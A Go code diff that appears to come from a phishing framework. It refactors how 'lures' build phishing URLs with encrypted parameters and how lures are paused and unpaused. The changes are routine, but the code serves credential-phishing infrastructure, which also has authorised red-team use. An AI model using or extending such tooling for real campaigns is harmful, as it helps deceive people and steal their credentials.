@@ -47,6 +47,14 @@ func (l *Lure) IsPaused() bool {
 	return !l.PausedUntil.IsZero() && time.Now().Before(l.PausedUntil)
 }
 
+// PausedUntilPtr returns a pointer to PausedUntil, or nil if not paused.
+func (l *Lure) PausedUntilPtr() *time.Time {
+	if l.PausedUntil.IsZero() {
+		return nil
+	}
+	return &l.PausedUntil
+}
+
 func (l *Lure) MatchesUA(ua string) bool {
 	if l.uaFilter == nil {
 		return true
@@ -68,17 +76,19 @@ func (l *Lure) CompileUA() error {
 	return nil
 }
 
-// GenerateURL builds the phishing URL, optionally embedding AES-256-GCM encrypted
-// custom parameters as a base64url query value.
-func (l *Lure) GenerateURL(baseDomain string, httpsPort int, params map[string]string) (string, error) {
+// URL returns the base phishing URL for this lure.
+func (l *Lure) URL(httpsPort int) string {
 	host := l.Hostname
-	if host == "" {
-		host = baseDomain
-	}
 	if httpsPort != 0 && httpsPort != 443 {
 		host = fmt.Sprintf("%s:%d", host, httpsPort)
 	}
-	base := "https://" + host + l.Path
+	return "https://" + host + l.Path
+}
+
+// URLWithParams returns the phishing URL with AES-256-GCM encrypted custom
+// parameters embedded as a base64url query value.
+func (l *Lure) URLWithParams(httpsPort int, params map[string]string) (string, error) {
+	base := l.URL(httpsPort)
 	if len(params) == 0 || len(l.ParamsKey) == 0 {
 		return base, nil
 	}
@@ -198,28 +208,28 @@ func (s *LureService) List() ([]*Lure, error) {
 	return s.Store.ListLures()
 }
 
-func (s *LureService) Pause(id string, d time.Duration) error {
+func (s *LureService) Pause(id string, d time.Duration) (*Lure, error) {
 	lure, err := s.Store.GetLure(id)
 	if err != nil {
-		return err
+		return nil, err
 	}
 	lure.PausedUntil = time.Now().Add(d)
 	if err := s.Store.UpdateLure(lure); err != nil {
-		return err
+		return nil, err
 	}
 	s.Invalidator.InvalidateLures()
-	return nil
+	return lure, nil
 }
 
-func (s *LureService) Unpause(id string) error {
+func (s *LureService) Unpause(id string) (*Lure, error) {
 	lure, err := s.Store.GetLure(id)
 	if err != nil {
-		return err
+		return nil, err
 	}
 	lure.PausedUntil = time.Time{}
 	if err := s.Store.UpdateLure(lure); err != nil {
-		return err
+		return nil, err
 	}
 	s.Invalidator.InvalidateLures()
-	return nil
+	return lure, nil
 }
